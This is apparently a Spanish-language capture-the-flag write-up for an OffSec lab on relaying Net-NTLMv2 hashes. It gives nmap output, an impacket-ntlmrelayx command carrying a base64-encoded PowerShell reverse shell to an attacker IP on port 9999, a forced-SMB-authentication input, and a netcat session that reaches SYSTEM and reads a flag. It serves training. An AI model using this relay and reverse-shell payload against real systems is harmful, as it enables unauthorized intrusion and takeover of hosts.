# Walk: Password Attacks - Relaying Net-NTLMv2 - VM Group 2 

## Objetivo
Capstone Lab: Start VM Group 2 and find a way to obtain a Net-NTLMv2 hash from 
the anastasia user via the web application on VM #3 (BRUTE2) and relay it to VM #4 (FILES02).
## Herramientas
1. impacket-ntlmrelayx

## Procedimiento y comandos
#### Paso 1: Enumeracion .202 .212
* **.202**
```bash
┌──(root㉿kali)-[/home/kali/OffSec/16-PasswordAttacks/Capstones]
└─# nmap -sV -sC -Pn -oN 202-nmap-results.txt 192.168.234.202    
# Nmap 7.95 scan initiated Thu Jun 26 16:38:20 2025 as: /usr/lib/nmap/nmap -sV -sC -Pn -oN 202-nmap-results.txt 192.168.234.202
Nmap scan report for 192.168.234.202
Host is up (0.19s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 1.4.1
|_ssl-date: TLS randomness does not represent time
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla.
| ssl-cert: Subject: commonName=filezilla-server self signed certificate
| Not valid before: 2022-06-20T21:11:52
|_Not valid after:  2023-06-21T21:16:52
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BRUTE2
| Not valid before: 2025-04-06T17:41:27
|_Not valid after:  2025-10-06T17:41:27
|_ssl-date: 2025-06-26T19:38:55+00:00; -6s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BRUTE2
|   NetBIOS_Domain_Name: BRUTE2
|   NetBIOS_Computer_Name: BRUTE2
|   DNS_Domain_Name: BRUTE2
|   DNS_Computer_Name: BRUTE2
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-26T19:38:46+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Beta App Template
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-26T19:38:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -6s, deviation: 0s, median: -6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 26 16:39:04 2025 -- 1 IP address (1 host up) scanned in 44.69 seconds
```
* **.212**
```bash
┌──(root㉿kali)-[/home/kali/OffSec/16-PasswordAttacks/Capstones]
└─# nmap -sV -sC -Pn -oN nmap-results.txt 192.168.234.212        
# Nmap 7.95 scan initiated Thu Jun 26 15:21:24 2025 as: /usr/lib/nmap/nmap -sV -sC -Pn -oN nmap-results.txt 192.168.234.212
Nmap scan report for 192.168.234.212
Host is up (0.16s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-26T18:21:50
|_  start_date: N/A
|_clock-skew: -6s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 26 15:22:02 2025 -- 1 IP address (1 host up) scanned in 37.60 seconds

```
#### Paso 2: Ejecutamos el receptor con payload LPORT 9999 y nc
* **ntlmrelayx**
```bash
┌──(root㉿kali)-[/home/kali/OffSec/16-PasswordAttacks/Capstones]
└─# impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.234.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQAKAA=="
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.234.202, attacking target smb://192.168.234.212
[*] Authenticating against smb://192.168.234.212 as BRUTE2/ANASTASIA SUCCEED
[*] All targets processed!
[*] SMBD-Thread-6 (process_request_thread): Connection from 192.168.234.202 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.234.202 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.234.202 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.234.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] All targets processed!
[*] SMBD-Thread-10 (process_request_thread): Connection from 192.168.234.202 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-11 (process_request_thread): Connection from 192.168.234.202 controlled, but there are no more targets left!
[*] Starting service RemoteRegistry
[*] All targets processed!
[*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.234.202 controlled, but there are no more targets left!
[*] All targets processed!
[*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.234.202 controlled, but there are no more targets left!
[*] Executed specified command on host: 192.168.234.212
[-] SMB SessionError: code: 0xc0000043 - STATUS_SHARING_VIOLATION - A file cannot be opened because the share access flags are incompatible.
[*] Stopping service RemoteRegistry
```
* **nc**
```bash
┌──(root㉿kali)-[/home/kali/OffSec/16-PasswordAttacks/Capstones]
└─# nc -lvnp 9999                                            
listening on [any] 9999 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.234.212] 49815
whoami
nt authority\system
PS C:\Windows\system32> cd C:\Users     
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          3/1/2023   5:32 AM                Administrator                                                        
d-----         6/20/2022   8:24 PM                anastasia                                                            
d-----          6/9/2022  12:27 PM                files02admin                                                         
d-r---          6/1/2022   3:04 PM                Public                                                               


PS C:\Users>
```
#### Paso 3: Ejecutamos el comando que fuerce la autenticacion SMB con el hash para el relay.
* **En el input de la web en .202**
```bash
dir \\192.168.45.213\test
```

#### Paso 4: Obtenemos el flag:
```powershell
PS C:\Users> cd anastasia
PS C:\Users\anastasia> cd Desktop
PS C:\Users\anastasia\Desktop> dir


    Directory: C:\Users\anastasia\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/26/2025  11:12 AM             38 flag.txt                                                             


PS C:\Users\anastasia\Desktop> type flag.txt
OS{9e50099392c6699ee98abce99f13e72b}
PS C:\Users\anastasia\Desktop>
```
## Troubleshooting
**Ejecutar tcpdump para corroborar trafico**
**Probar primero con comandos simples como -c "whoami"**


